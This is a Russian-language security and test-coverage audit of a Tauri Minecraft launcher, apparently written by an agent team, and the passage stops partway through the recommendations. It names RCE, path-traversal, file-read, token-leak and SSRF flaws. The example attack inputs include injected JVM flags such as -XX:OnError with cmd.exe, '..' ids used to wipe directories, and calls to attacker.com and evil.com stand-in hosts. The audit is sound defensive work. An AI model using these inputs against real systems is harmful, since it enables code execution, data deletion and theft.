# Отчёт независимого аудита безопасности, изоляции и надёжности тестов (mc-launcher-v2)

**Исследовательский кластер**: Explorer Cluster 4  
**Рабочая директория**: `c:\Users\Admin\.zcode\workspace\default\mc-launcher-v2\.agents\teamwork\explorer_cluster4`  
**Направления аудита**:
- **Направление 7**: Безопасность и изоляция (Security & Isolation)
- **Направление 8**: Покрытие и надёжность тестов (Test Coverage & Reliability)

---

## 1. Резюме ключевых находок

| ID | Категория | Находка | Ссылка на код | Критичность | Практическое влияние |
|---|---|---|---|---|---|
| **SEC-1** | IPC / RCE | RCE через невалидированные JVM-флаги и аргументы запуска в `instance_settings_set` + `instance_launch` | `commands/mod.rs:155-161`, `instances/run.rs:260-262`, `mojang/launch.rs:164-180` | **P0 (Критическая)** | При XSS или компрометации WebView злоумышленник может внедрить `-XX:OnError="cmd.exe /c ..."` или `-javaagent:...` и выполнить произвольный код в ОС. |
| **SEC-2** | IPC / FS | Удаление произвольных каталогов лаунчера через path traversal в `instance_delete` | `commands/mod.rs:133-136`, `instances/mod.rs:291-314` | **P0 (Критическая)** | `instance_delete` не проверяет `valid_id(id)`. Передача `id: "."` или `id: ".."` с `wipe: true` удаляет весь каталог инстансов или корень данных лаунчера (`accounts.json`, `settings.json`). |
| **SEC-3** | Логирование / Утечки | Утечка токенов в логах игры и IPC-событиях `game_log_line`, ошибки без санитизации | `instances/run.rs:476-481, 686-692`, `auth/msa.rs:276-280, 405-408` | **P1 (Высокая)** | Редактор секретов (`RedactingWriter`) подключён ТОЛЬКО к `launcher.log`. Строки логов игры (`latest.log`) и события `game_log_line` передаются в UI сырыми. При дампе аргументов токен утекает. |
| **SEC-4** | IPC / Утечки | Чтение произвольных локальных файлов до 300 КБ через `instance_icon_set` | `commands/mod.rs:373-384`, `instances/content.rs:240-258` | **P1 (Высокая)** | Бэкенд принимает произвольный `path: String` без проверки происхождения из нативного диалога. Сниффинг magic bytes фильтрует формат, но создаёт оракул чтения файлов. |
| **SEC-5** | Drag & Drop / SSRF | Отсутствие валидации хостов загрузки в `modrinth.index.json` при установке `.mrpack` | `modrinth/mrpack.rs:148-168`, `util/zip.rs:140-146` | **P1 (Высокая)** | Дропнутый `.mrpack` может содержать ссылки на произвольные внешние или внутренние сетевые адреса (SSRF), а стриппинг-распаковка не проверяет симлинки. |
| **SEC-6** | CSP | Отсутствие директив `base-uri`, `object-src`, `form-action` в Content Security Policy | `src-tauri/tauri.conf.json:24-26` | **P2 (Средняя)** | Риск внедрения тега `<base>` и отправки форм на сторонние домены при наличии HTML-инъекции. |
| **TEST-1** | Покрытие | Полное отсутствие тестов для критической команды `instance_launch` | `commands/mod.rs:166-270`, `instances/run.rs:41-315` | **P1 (Высокая)** | Ядро оркестрации запуска, отмены, concurrency guard и супервизии процесса игры не покрыто ни одним юнит/интеграционным тестом в Rust. |
| **TEST-2** | Хрупкость тестов | Флапающие тесты с жесткими временными зависимостями (`sleep`) | `tests/download_engine.rs:287, 304`, `modrinth/mrpack.rs:465` | **P2 (Средняя)** | Тесты прогресса и отмены полагаются на фиксированные задержки 400–500 мс и падают при повышенной нагрузке на CPU / в виртуализованных CI-раннерах. |
| **TEST-3** | Гонки тестов | Мутация глобального состояния `util::redact::registry` и коллизия Windows Credential Manager | `util/redact.rs:8-18`, `auth/mod.rs:226-235` | **P2 (Средняя)** | Статический `HashSet` секретов мутирует в параллельных тестах без очистки. Тест `keyring_roundtrip` обращается к реальному хранилищу ОС под фиксированным ключом. |
| **TEST-4** | Фиктивные тесты | Mock-only / Fixture-only тесты, проверяющие только десериализацию статических JSON | `modrinth/api.rs:141-155`, `loaders/forge.rs:104-118`, `mojang/manifest.rs:168-178` | **P2 (Средняя)** | Тесты проверяют только парсер `serde_json`, игнорируя логику сетевых запросов, обработку ошибок, таймауты и инварианты доменной модели. |

---

## 2. Направление 7: Безопасность и изоляция (Security & Isolation)

### 7.1. Конфигурация CSP (Content Security Policy) в релизной сборке Tauri
**Файл**: `src-tauri/tauri.conf.json`, строки 24–26:
```json
    "security": {
      "csp": "default-src 'self'; connect-src ipc: http://ipc.localhost; img-src 'self' data: https://cdn.modrinth.com; style-src 'self' 'unsafe-inline'; font-src 'self' data:"
    }
```

#### Детальный аудит директив:
1. `default-src 'self'`:
   - Ограничивает базовые типы ресурсов собственным источником бандла (`http://tauri.localhost` / `https://tauri.localhost` / `tauri://localhost`).
   - Поскольку `script-src` явно не задан, он наследуется от `default-src 'self'`. Это предотвращает загрузку внешних скриптов с произвольных CDN и блокирует inline-скрипты `<script>` без nonce/хэша.
2. `connect-src ipc: http://ipc.localhost`:
   - Жестко ограничивает сетевой транспорт WebView2: `fetch()`, `XMLHttpRequest`, `WebSocket`, `EventSource` разрешены **только** на внутренние схемы Tauri IPC (`ipc:`, `http://ipc.localhost`).
   - Любая попытка из WebView выполнить прямой сетевой запрос на внешний сервер (например, `fetch("https://evil.com/leak")`) блокируется браузерным движком.
3. `img-src 'self' data: https://cdn.modrinth.com`:
   - Разрешает загрузку картинок из собственного бандла, data-URL (используется для иконок инстансов) и официального CDN Modrinth (`https://cdn.modrinth.com`).
   - Исключает загрузку изображений с произвольных сторонних хостов, минимизируя риски эксфильтрации данных через `<img src="...">`.
4. `style-src 'self' 'unsafe-inline'`:
   - Разрешает инлайн-стили (`'unsafe-inline'`). Это необходимо для динамических CSS-переменных, Tailwind runtime-стилей и изменения масштаба шрифта (`font-size` на `<html>` при зуме). Однако наличие `'unsafe-inline'` оставляет теоретический вектор атак через CSS-инъекции.
5. `font-src 'self' data:`:
   - Разрешает загрузку локальных шрифтов и шрифтов в base64 data-URL.

#### Пробелы и уязвимости конфигурации CSP:
- **Отсутствие `base-uri`**: Не задан `base-uri 'none'` или `base-uri 'self'`. При наличии уязвимости HTML-инъекции атакующий может внедрить тег `<base href="https://attacker.com/">`, что приведёт к переопределению относительных путей для скриптов и стилей.
- **Отсутствие `object-src 'none'`**: По умолчанию наследует `'self'`, тогда как рекомендованной практикой для desktop WebView приложений является явный запрет плагинов `object-src 'none'`.
- **Отсутствие `form-action`**: Не ограничивает адреса отправки HTML-форм (`<form action="...">`).
- **Различие dev и prod окружения**: В dev-режиме (`devUrl: "http://localhost:1420"`, `tauri.conf.json:9`) данная CSP не действует (Vite требует HMR через WebSocket и инжектирует скрипты). Это создаёт риск того, что фронтенд-разработчики могут случайно внедрить несовместимый с CSP код, который пройдёт проверку в dev, но сломает релизную сборку.

---

### 7.2. Анализ поверхности атаки IPC при потенциальной компрометации WebView
Лаунчер экспортирует **44 команды** через `tauri::generate_handler!` в `src-tauri/src/lib.rs:104-151`. Все обработчики команд расположены в `src-tauri/src/commands/mod.rs`.

Ниже представлен детальный анализ рисков при условии, что злоумышленник получил возможность вызывать произвольные IPC-команды из контекста WebView (например, через XSS в отображении описания мода, имени инстанса, логе краша или зависимости `node_modules`):

| Команда IPC | Принимаемые аргументы | Валидация аргументов в ядре | Анализ риска и вектор эксплуатации |
|---|---|---|---|
| `instance_settings_set` | `instance: Instance` | `valid_id(&instance.id)` (`instances/mod.rs:203`) | **RCE (P0)**: Поля `jvm_flags`, `game_args_extra`, `java_path` сохраняются в `instance.json` без валидации. При последующем `instance_launch` эти флаги передаются напрямую в `std::process::Command` (`run.rs:260-262`, `mojang/launch.rs:164-180`). Атакующий может передать `-XX:OnError="calc.exe"`, `-javaagent:...` или произвольный бинарник в `java_path`. |
| `instance_launch` | `id: String`, `player: String` | Проверка `running_pid` и `launching` lock | **RCE (P0)**: Запускает скомпрометированный инстанс с внедренными флагами, выполняя код за пределами песочницы WebView2. |
| `instance_delete` | `id: String`, `wipe: bool` | **НЕТ валидации `valid_id`!** (`instances/mod.rs:291-314`) | **Arbitrary Deletion / DoS (P0)**: Передача `id: "."` или `id: ".."` при `wipe: true` вызывает `std::fs::remove_dir_all` на родительский каталог (`instances/` или корень данных лаунчера). При `wipe: false` на Windows выполняется PowerShell-команда через конкатенацию строк (`instances/mod.rs:320-327`). |
| `instance_icon_set` | `id: String`, `path: String` | `valid_id` инстанса; `sniff_image` и лимит 300 КБ на файл | **Arbitrary File Read / Oracle (P1)**: Читает файл по произвольному пути `path` на диске (`content.rs:243`). Если файл имеет сигнатуру PNG/JPEG/WebP, он кодируется в base64 и сохраняется в `instance.json`, откуда может быть прочитан через `instance_settings_get`. Для других файлов работает как оракул существования и прав доступа. |
| `settings_set` | `settings: Settings` | Нет валидации URL прокси (`commands/mod.rs:878-894`) | **Traffic Hijacking / MiTM (P1)**: Установка `proxy_url: "http://attacker.com:8080"` перенаправляет весь внешний трафик лаунчера через сервер атакующего. |
| `instance_open_dir` | `id: String` | **НЕТ валидации `valid_id`!** (`commands/mod.rs:139-144`) | **Path Traversal / UI Spoofing (P2)**: `instances::instance_dir` склеивает `paths.instances_dir().join(id)`. Передача `../../..` откроет произвольную системную папку в Проводнике Windows. |
| `instance_kill` | `instance_id: String` | Проверка существования PID (`commands/mod.rs:520-553`) | **Denial of Service (P2)**: Принудительное завершение процессов инстансов. |
| `instance_create` | `mc_version: String`, `name: String` | `resolve_entry` в манифесте + `sanitize_user_name` | **Безопасно**: Имя инстанса санитизируется, id генерируется ядром (`Uuid::new_v4()`). |
| `content_toggle` / `content_remove` | `instance_id`, `file` | `resolve_content_file` (`content.rs:40-56`) | **Безопасно**: Путь проверяется против белого списка (`mods/`, `resourcepacks/`, `shaderpacks/`), запрещены `..`, `:`, `\`. |

---

### 7.3. Безопасность Drag & Drop и валидация архивов (.mrpack)

#### 1. Обработка событий в интерфейсе (`src/ui/layout/Shell.tsx`):
- Строки 98–105:
  ```typescript
  void getCurrentWebview().onDragDropEvent((event) => {
    if (event.payload.type !== "drop") return;
    const path = event.payload.paths.find((p) => p.toLowerCase().endsWith(".mrpack"));
    if (!path) return;
    void installDroppedMrpack(path);
  });
  ```
- **Наблюдение**: На уровне UI событие перехватывается только для файлов с расширением `.mrpack`. Любые другие брошенные файлы (например, `.exe`, `.bat`, `.jar`) игнорируются интерфейсом.

#### 2. Проверка структуры архива в ядре (`src-tauri/src/modrinth/mrpack.rs`):
- Строки 73–87 (`open_mrpack`):
  - Файл открывается через `zip::ZipArchive::new(file)`. Если файл не является корректным ZIP-архивом, возвращается `LauncherError::Zip`.
  - Обязательно проверяется наличие `modrinth.index.json`. В случае отсутствия возвращается `LauncherError::InvalidInput`.
  - Манифест парсится в `MrpackIndex` и валидируется: `formatVersion == 1` и `game == "minecraft"`.
- **Вывод**: Переименование вредоносного исполняемого файла в `.mrpack` не приведет к его выполнению — архив будет сразу же отвергнут на этапе парсинга.

#### 3. Защита от Zip-Slip и Zip-Bomb (`src-tauri/src/util/zip.rs`):
- Строки 14–32 (`safe_relative_path`):
  - Запрещает символы NUL (`\0`).
  - Нормализует слэши `\` в `/`.
  - Разбирает компоненты пути через `Path::components()`. Любые компоненты `..`, `/`, `C:` немедленно вызывают ошибку `LauncherError::ZipSlip`.
- Строки 53–58, 83–86 (`extract_zip_filtered`):
  - Лимит на количество записей: `MAX_ENTRIES = 200_000`.
  - Лимит на распакованный размер: `MAX_TOTAL_UNCOMPRESSED = 8 * 1024 * 1024 * 1024` (8 ГБ). Защищает от DoS через архивы-бомбы.
  - Каноническая проверка префикса: `target.starts_with(&dest_long)`.

#### 4. Выявленные уязвимости и несоответствия в Drag & Drop / архивах:
1. **Несоответствие обработки симлинков**:
   - В `extract_zip_filtered` (`util/zip.rs:75-78`) симлинки явно игнорируются:
     ```rust
     if file.is_symlink() {
         tracing::warn!("zip: пропуск симлинка {name}");
         continue;
     }
     ```
   - Однако в `extract_zip_stripping` (`util/zip.rs:140-146`), которая используется для распаковки каталога `overrides/` из `.mrpack` и CF-архивов, **проверка `file.is_symlink()` отсутствует!** Хотя `std::fs::File::create` создаёт обычный файл с содержимым целевого пути симлинка, отсутствие единого правила для недоверенных входов является архитектурным дефектом.
2. **Отсутствие валидации доменов для загрузки контента (SSRF)**:
   - В `mrpack.rs:148-168` массив `index.client_files()` формирует задачи загрузки: `url: f.downloads[0].clone()`.
   - Ядро лаунчера **не проверяет**, что URL ведёт на `https://cdn.modrinth.com`. Злоумышленник может создать валидный `.mrpack`, указав в `downloads` ссылки на приватные внутренние ресурсы локальной сети (например, `http://192.168.1.1/...` или `http://127.0.0.1:8080`), вызвав SSRF через DownloadEngine лаунчера.
3. **Неограниченное размещение файлов внутри каталога Minecraft**:
   - `mrpack.rs:161-162`: файл скачивается по пути `minecraft_dir.join(rel)`.
   - В отличие от ручной установки модов (где `resolve_content_file` разрешает только `mods/`, `resourcepacks/`, `shaderpacks/`), `.mrpack` может записывать файлы в любые подпапки `minecraft/` (например, перезаписывать конфиги или подкладывать скрипты).

---

### 7.4. Фильтры нативных диалогов и верификация Magic Bytes

#### 1. Установка иконки инстанса (`src-tauri/src/instances/content.rs`):
- Строки 240–258 (`set_icon`) и 268–278 (`sniff_image`):
  ```rust
  fn sniff_image(data: &[u8]) -> Option<&'static str> {
      if data.starts_with(&[0x89, b'P', b'N', b'G']) {
          Some("image/png")
      } else if data.starts_with(&[0xFF, 0xD8, 0xFF]) {
          Some("image/jpeg")
      } else if data.len() > 12 && &data[0..4] == b"RIFF" && &data[8..12] == b"WEBP" {
          Some("image/webp")
      } else {
          None
      }
  }
  ```
  - **Magic Bytes верифицируются честно**: сигнатуры PNG (`89 50 4E 47`), JPEG (`FF D8 FF`) и WebP (`RIFF....WEBP`) проверяются по содержимому первых байт файла.
  - Расширение файла бэкендом игнорируется: если переименовать `virus.exe` в `icon.png`, вызов завершится ошибкой `"поддерживаются PNG, JPEG и WebP"`.
  - Установлен лимит размера: `MAX_ICON_BYTES = 300 * 1024` (300 КБ).

#### 2. Фильтры диалогов на фронтенде (`src/ui/components/pickFile.ts`, `src/ui/pages/ModsPage.tsx`):
- `pickFile.ts:11-14`:
  ```typescript
  const picked = await open({
    multiple: false,
    filters: [{ name: "PNG / JPEG / WebP", extensions: ["png", "jpg", "jpeg", "webp"] }],
  });
  ```
- `ModsPage.tsx:201-204`:
  ```typescript
  const path = await open({
    multiple: false,
    filters: [{ name: "Modrinth Modpack", extensions: ["mrpack"] }],
  });
  ```
- **Наблюдение**: Нативный диалог ОС (`@tauri-apps/plugin-dialog`) ограничивает отображение файлов расширениями в UI. Однако, как доказано в п. 7.2, бэкенд команды `instance_icon_set` принимает сырую строку `path: String` и не проверяет, что путь получен из диалога, допуская прямое обращение через IPC.

---

### 7.5. Изоляция секретов и аудит фильтра маскирования логов (Redaction)

#### 1. Хранение секретов в ОС Keyring (`src-tauri/src/auth/mod.rs`):
- Строки 109–135:
  - Используется крейт `keyring = "4.2.0"`.
  - На Windows интеграция осуществляется через **Windows Credential Manager**.
  - Константа сервиса: `KEYRING_SERVICE = "mc-launcher-v2"`.
  - Имена записей генерируются как случайные UUID: `msa-refresh-{uuid}` (`commands/mod.rs:622, 675`) и `ely-refresh-{uuid}` (`commands/mod.rs:698`).
  - В файле `accounts.json` (`auth/mod.rs:21-32`) хранятся **только ссылки** (`refresh_ref: Some("msa-refresh-...")`). Сами токены в JSON-файлы на диск никогда не сохраняются.
  - При удалении профиля (`auth/mod.rs:79-91`) запись из keyring гарантированно удаляется (`keyring_delete`).

#### 2. Анализ фильтра маскирования логов (`src-tauri/src/util/redact.rs`, `src-tauri/src/lib.rs`):
- Строки 8–30 (`util/redact.rs`):
  ```rust
  fn registry() -> &'static Mutex<HashSet<String>> {
      static REG: OnceLock<Mutex<HashSet<String>>> = OnceLock::new();
      REG.get_or_init(|| Mutex::new(HashSet::new()))
  }

  pub fn register_secret(secret: &str) {
      if secret.len() >= 8 {
          registry().lock().unwrap().insert(secret.to_string());
      }
  }

  pub fn redact(text: &str) -> String {
      let reg = registry().lock().unwrap();
      let mut out = text.to_string();
      for secret in reg.iter() {
          if out.contains(secret.as_str()) {
              out = out.replace(secret.as_str(), "[REDACTED]");
          }
      }
      out
  }
  ```
- В `src-tauri/src/lib.rs:24-38` фильтр обёрнут в `RedactingWriter`:
  ```rust
  impl<W: std::io::Write> std::io::Write for RedactingWriter<W> {
      fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
          let text = String::from_utf8_lossy(buf);
          let safe = util::redact::redact(&text);
          self.inner.write_all(safe.as_bytes())?;
          Ok(buf.len())
      }
  }
  ```

#### 3. Критические дефекты фильтра маскирования:
1. **Отсутствие регулярных выражений (Pattern-based Redaction)**:
   - `redact()` заменяет **только** те строки, которые были предварительно переданы в `register_secret()`.
   - Если токен появился в логах до регистрации (например, в заголовке `Authorization: Bearer ...` при ошибке HTTP или пароль от Ely.by), он **НЕ будет скрыт**!
2. **Логи игры и события IPC обходят фильтр**:
   - `RedactingWriter` подключен **исключительно к `launcher.log`** (`lib.rs:67`).
   - В `src-tauri/src/instances/run.rs:476, 686` строки стандартного вывода игры пишутся в файл лога инстанса `latest.log` напрямую через `writeln!(log_file, "{line}")` без вызова `redact()`.
   - В `run.rs:477-481, 688-692` событие `LauncherEvent::GameLogLine` рассылается в EventBus с сырой строкой `line`.
   - Если мод, краш-логгер или Java выведет параметры запуска командной строки (содержащие `--accessToken <token>`), токен в открытом виде попадет в `latest.log` и окно интерфейса!
3. **Утечки в ошибках IPC**:
   - В `auth/msa.rs:276-280` и `405-408`:
     ```rust
     let body = resp.text().await.unwrap_or_default();
     return Err(LauncherError::network(format!("loginWithXbox: HTTP {status}, тело ответа: {body}")));
     ```
     Сырое тело ответа сервера авторизации пробрасывается в `LauncherError::Network`, сериализуется в JSON и отправляется в WebView.
4. **Утечки через `println!` в консоль**:
   - В `auth/msa.rs:226-234, 258` данные пользователя Xbox выводятся через макрос `println!`, минуя систему `tracing` и `RedactingWriter`:
     `println!("Вошли как (Xbox): {} (xid {})", v["DisplayClaims"]["xui"][0]["gtg"], ...);`

---

### 7.6. Анализ возможностей Tauri (Capabilities) и принцип наименьших привилегий
**Файл**: `src-tauri/capabilities/default.json`:
```json
{
  "$schema": "../gen/schemas/desktop-schema.json",
  "identifier": "default",
  "description": "Capability for the main window",
  "windows": ["main"],
  "permissions": [
    "core:default",
    "opener:default",
    "core:window:allow-minimize",
    "core:window:allow-toggle-maximize",
    "core:window:allow-maximize",
    "core:window:allow-unmaximize",
    "core:window:allow-is-maximized",
    "core:window:allow-close",
    "core:window:allow-start-dragging",
    "dialog:default"
  ]
}
```

#### Оценка соблюдения принципа наименьших привилегий (Least Privilege):
- **Позитивные аспекты**:
  - Разрешения на манипуляцию окном (`core:window:allow-*`) гранулярны.
  - Плагин работы с файловой системой `@tauri-apps/plugin-fs` **отключен** (нет `fs:default`), прямой произвольный доступ к файлам из WebView через плагин закрыт.
  - Плагин выполнения команд оболочки `@tauri-apps/plugin-shell` **отключен** (нет `shell:default`).
- **Недостатки и риски**:
  - `opener:default`: Плагин `tauri-plugin-opener` разрешает открытие произвольных URI через системную ассоциацию без ограничений по протоколам (например, `calc:`, `ms-msdt:`, `file:///...`).
  - **Обход модели полномочий через кастомные команды**: Отсутствие `fs` и `shell` в capabilities нивелируется тем, что собственные команды бэкенда лаунчера (`instance_icon_set`, `instance_delete`, `instance_launch`) предоставляют неограниченный доступ к чтению файлов, удалению папок и запуску внешних процессов без каких-либо проверок разрешений внутри Tauri.

---

## 3. Направление 8: Покрытие и надёжность тестов (Test Coverage & Reliability)

### 8.1. Идентификация Топ-10 критических непокрытых команд ядра и интерфейсных веток

В кодовой базе лаунчера 102 теста в библиотеке `mc_launcher_v2_lib` и 10 тестов в `download_engine`. Однако при сплошном анализе `commands/mod.rs` выявлены критические пробелы:

| № | Непокрытая команда / ветка | Файл:строки | Почему это критично | Конкретный тест-сценарий для покрытия |
|---|---|---|---|---|
| **1** | `instance_launch` (Оркестрация запуска игры) | `commands/mod.rs:166-270`, `instances/run.rs:41-315` | Главная функция лаунчера. Не имеет **ни одного** теста в `cargo test`. | Поднять локальный mock-сервер для манифеста, клиента и ассетов. Вызвать `instance_launch`. Проверить переходы фаз `Preparing -> Downloading -> Launched`, проверку блокировки при уже запущенном процессе (`running_pid`), защиту от повторного запуска (`launching.contains`), отмену в фазе prepare и генерацию `.lock`. |
| **2** | `instance_delete` (Удаление инстанса и защита от traversal) | `commands/mod.rs:133-137`, `instances/mod.rs:291-314` | Отсутствует валидация `valid_id`, есть риск удаления каталога данных. | Вызвать `instance_delete` с недопустимыми ID (`"."`, `".."`). Проверить отклонение с `InvalidInput`. Проверить отказ удаления работающего инстанса (`running_pid`). Проверить, что при `wipe: false` общие hardlinks не удаляются из `store/`, а уникальные каталоги (`saves`, `mods`) перемещаются в корзину. |
| **3** | `account_add_msa_browser` и цепочка OAuth | `commands/mod.rs:587-634`, `auth/msa.rs:320-418` | Полностью изолировано от автоматических тестов из-за привязки к браузеру. | Запустить локальный mock OAuth-сервер. Сэмулировать HTTP-редирект с кодом авторизации на порт локального `TcpListener`. Проверить `finish_web_login`, обмен на токены XBL/XSTS/Minecraft, регистрацию секрета в `redact` и запись в keyring. Проверить сценарий таймаута (300 с) и отмены. |
| **4** | `account_add_ely` (Авторизация Ely.by) | `commands/mod.rs:691-710`, `auth/ely.rs:22-59` | Бизнес-логика авторизации не тестируется автоматически. | Поднять mock-сервер для `authserver.ely.by`. Проверить успешный ответ с генерацией сессии, проверку регистрации токена в `register_secret`, обработку неверного логина/пароля (HTTP 403), обработку ошибки сети и сохранение в `accounts.json`. |
| **5** | `instance_settings_set` (Валидация флагов и настроек) | `commands/mod.rs:155-161`, `instances/mod.rs:202-208` | Потенциальный вектор RCE при небезопасных JVM-флагах. | Передать в `instance_settings_set` инстанс с опасными аргументами (`-XX:OnError=...`, `-javaagent:...`), гигантским `ram_mb` (100 ГБ при 8 ГБ RAM) и спецсимволами. Проверить валидацию и отказ сохранения некорректных параметров. |
| **6** | `instance_kill` (Отмена подготовки и принудительный останов) | `commands/mod.rs:520-553` | Проверялся только внешним node-скриптом, нет Rust юнит-тестов. | Тест гонки: вызвать `instance_kill` ровно в момент фазы `Preparing` (когда процесс еще не создан, но задачи в движке загрузок активны). Убедиться, что `cancel_engine_group` отменяет загрузку, временные `.part` файлы удаляются, а событие `LaunchState::Exited` доставляется в шину. |
| **7** | `content_install` / `content_update_all` | `commands/mod.rs:298-320, 418-430`, `modrinth/install.rs` | Пакетные сетевые операции с модификацией манифеста инстанса. | Mock API Modrinth. Добавить в инстанс мод с зависимостями. Проверить корректность заполнения `content-manifest.json`. Сэмулировать сбой сети на 3-м файле из 5: проверить, что не возникает рассинхронизации между файлами на диске и манифестом. |
| **8** | `java_install` (Adoptium JRE) | `commands/mod.rs:860-868`, `java/adoptium.rs:50-120` | Реальный запуск помечен `#[ignore]`. | Запустить mock HTTP-сервер, отдающий архив JRE и тестовую контрольную сумму SHA-256. Проверить распаковку, проверку прав исполнения, верификацию битого хэша (откат и очистка временных папок) и проверку версии. |
| **9** | `instance_icon_set` (Граничные условия и безопасность) | `commands/mod.rs:373-384`, `instances/content.rs:240-258` | Проверка лимитов памяти и оракула файлов. | Передать файл размером ровно 300 КБ, 301 КБ, файл нулевого размера, несуществующий файл, текстовый файл с поддельным заголовком PNG. Проверить корректность возвращаемых ошибок `NotFound` / `InvalidInput`. |
| **10** | `CrashReportModal` & `crash_analyze` (UI-ветка анализа лога) | `src/ui/components/CrashReportModal.tsx`, `commands/mod.rs:757-760` | Единственный UI-компонент диагностики крашей игры. | Тест в Playwright/Vitest: генерация события `launch_state: exited` с ненулевым кодом выхода. Проверка автоматического открытия модального окна, корректного рендеринга чипов с рекомендациями (память, Java, дубликаты модов), работы клавиши Escape и копирования отчета в буфер обмена. |

---

### 8.2. Анализ хрупких тестов (Flaky Tests)

#### 1. Зависимости от времени (`sleep`) в `tests/download_engine.rs`:
- Строки 278–312 (`cancel_group_stops_and_cleans_parts`):
  ```rust
  let cancel_task = tokio::spawn(async move {
      tokio::time::sleep(Duration::from_millis(400)).await;
      e2.cancel_group("test");
  });
  ```
  - **Проблема**: Тест запускает поток данных со скоростью 50 мс на чанк и ждёт фиксированные 400 мс перед отменой. На загруженном CI-сервере или одноядерной виртуальной машине поток может либо завершиться раньше 400 мс, либо вообще не успеть стартовать. Это приведет к случайным падениям с утверждением `assert_eq!(st.cancelled, 1)`.
- Строки 197–218 (`timeout_fails_task`):
  - Сервер axum засыпает на 5 секунд (`sleep(5s)`), а клиент ожидает таймаут 300 мс / 1 с. Тест искусственно замедляет весь сьют на 1 секунду.

#### 2. Зависимости от времени в `src-tauri/src/modrinth/mrpack.rs`:
- Строки 460–505 (`progress_goes_to_caller_bus_and_instance_saved_after_download`):
  ```rust
  axum::routing::get(|| async {
      tokio::time::sleep(std::time::Duration::from_millis(500)).await;
      axum::body::Body::from(MOD_BYTES.to_vec())
  })
  ...
  assert!(progress > 0, "dl_progress должен идти в шину вызывающего");
  ```
  - **Проблема**: Тест ожидает, что фоновый тикер прогресса (период 100 мс) успеет сработать минимум 1 раз за время искусственной 500 мс паузы. При конкуренции потоков тикер может задержаться, и `progress` останется равным 0, вызывая ложный сбой теста.

#### 3. Тесты с реальной сетью, отключенные через `#[ignore]`:
- `src-tauri/src/java/adoptium.rs:178` (`installs_real_jre_17`) — качает реальный JRE с API Adoptium.
- `src-tauri/src/loaders/fabric.rs:58` (`fetches_profile_for_1_20_1`) — обращается к `meta.fabricmc.net`.
- `src-tauri/src/loaders/neoforge.rs:211` (`lists_versions`) — обращается к Maven NeoForge.
- `src-tauri/src/modrinth/api.rs:160` (`real_search`) — обращается к `api.modrinth.com`.
- **Проблема**: Эти тесты исключены из обычного `cargo test` (`#[ignore]`), из-за чего интеграционная работоспособность сетевых клиентов не верифицируется в штатном пайплайне. Если запустить их с `-- --ignored`, тесты становятся крайне нестабильными из-за возможных сбоев DNS, блокировок провайдеров или сетевых таймаутов.

#### 4. Хрупкость сквозных UI-скриптов (`scripts/*.cjs`):
- Во всех скриптах (`kill_acceptance.cjs`, `e2e_features.cjs`, `ui_checks.cjs`) присутствуют жесткие паузы:
  `await page.waitForTimeout(500);`, `await page.waitForTimeout(600);`.
- Селекторы содержат захардкоженные русские строки: `text=Инстансы`, `button[aria-label^="Играть —"]`, `text=Выделение оперативной памяти`. Если лаунчер стартует на английском языке (дефолт D30), все эти скрипты падают с таймаутом селектора.

---

### 8.3. Потенциальные гонки при параллельном запуске тестов (Parallel Test Races)

Cargo по умолчанию запускает тесты многопоточно (`--test-threads = num_cpus`). В проекте выявлены следующие точки межтестовых гонок:

1. **Глобальный статический реестр секретов (`src-tauri/src/util/redact.rs:8-18`)**:
   - `registry()` инициализируется как глобальный `OnceLock<Mutex<HashSet<String>>>`.
   - Тест `redacts_registered_secret` регистрирует `"SUPERSECRETVALUE123"`.
   - Зарегистрированные секреты **никогда не удаляются** из памяти. Любой другой тест, запущенный параллельно или позже в том же процессе, проверяющий функцию `redact()`, работает с загрязненным глобальным состоянием.
2. **Конкуренция за системный Windows Credential Manager (`src-tauri/src/auth/mod.rs:226-235`)**:
   - Тест `keyring_roundtrip` (помечен `#[ignore]`) использует константный сервис `"mc-launcher-v2"` и фиксированное имя ключа `"test-refresh-roundtrip"`.
   - Если запустить тесты с `-- --ignored` в несколько потоков или на машине разработчика параллельно с запущенным лаунчером, происходит одновременная запись и удаление одного и того же системного секрета в ОС Windows.
3. **Логирование и файл `launcher.log` (`src-tauri/src/lib.rs:48-55`)**:
   - `RedactingMakeWriter` при невозможности создать файл в заданной директории откатывается на создание `launcher.log` в текущей рабочей директории процесса:
     `std::fs::File::create(std::path::PathBuf::from("launcher.log")).unwrap()`.
   - Если параллельные тесты инициализируют логирование, они конкурируют за монопольную запись в один и тот же файл в корне репозитория.

---

### 8.4. Оценка тестов, проверяющих только конфигурацию моков (Mock-Only Tests)

В тестах ядра обнаружена группа проверок, которые не валидируют реальные инварианты системы, а лишь повторяют тривиальную сериализацию/десериализацию статических файлов:

1. **`src-tauri/src/modrinth/api.rs:141-155` (`parses_search_fixture`, `parses_version_fixture`)**:
   - Загружает `tests/fixtures/modrinth_search.json` и проверяет `result.hits.len() == 1` и `hit.title == "Sodium"`.
   - Тест не проверяет ни построение URL поиска, ни валидацию фасетов, ни фильтрацию по версиям/загрузчикам, ни устойчивость к 404/500/RateLimit. Он проверяет исключительно библиотеку `serde_json`.
2. **`src-tauri/src/loaders/forge.rs:104-118` (`parse_promotions_fixture`)**:
   - Загружает `tests/fixtures/forge_promotions.json` и делает `assert!(promos.promos.len() > 0)`.
   - Не проверяет бизнес-логику выбора рекомендованной версии Forge при её отсутствии или конфликте версий.
3. **`src-tauri/src/java/adoptium.rs:192-205` (`adoptium_metadata_parses`)**:
   - Десериализует статическую JSON-строку ответа Adoptium. Не тестирует логику сопоставления архитектуры ОС (x64/arm64) или выборку бинарников.
4. **`src-tauri/src/mojang/manifest.rs:168-178` (`parse_manifest_fixture`)**:
   - Десериализует `version_manifest_sample.json`.
5. **`src-tauri/src/mojang/version.rs:434-458` (`parse_modern_version_json`, `parse_legacy_version_json`)**:
   - Проверяет парсинг статических JSON версий 1.20.1 и 1.12.2.

**Итог**: Данные тесты создают видимость высокого покрытия (102 теста), но оставляют всю фактическую сетевую и файловую логику обработки граничных условий без валидации.

---

## 4. Рекомендации по устранению дефектов

1. **Защита IPC и устранение RCE (Приоритет: P0)**:
   - Внедрить жесткий белый список JVM-аргументов в `mojang/launch.rs` и `instances/run.rs`. Запретить флаги, исполняющие команды (`-XX:OnError`, `-XX:OnOutOfMemoryError`, `-javaagent` кроме доверенного authlib-injector).
   - Ограничить `ram_mb` максимальным значением (clamp: не более 75% физической RAM системы).
   - Валидировать `java_path`: разрешать только исполняемые файлы, прошедшие проверку `java -version`.
2. **Устранение Path Traversal в `instance_delete` (Приоритет: P0)**:
